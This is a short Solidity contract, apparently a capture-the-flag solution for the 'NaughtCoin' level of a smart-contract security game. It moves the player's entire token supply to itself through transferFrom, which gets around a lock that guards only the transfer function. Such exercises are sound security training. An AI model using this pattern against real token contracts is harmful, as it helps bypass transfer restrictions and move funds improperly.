// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/15-NaughtCoin.sol";

contract NaughtCoinAttacker {
    NaughtCoin public naughtCoin;

    constructor(address _naughtCoin) {
        naughtCoin = NaughtCoin(_naughtCoin);
    }

    /// @dev assumes this contract has necessary approval
    function attack() external {
        naughtCoin.transferFrom(msg.sender, address(this), naughtCoin.INITIAL_SUPPLY());
    }
}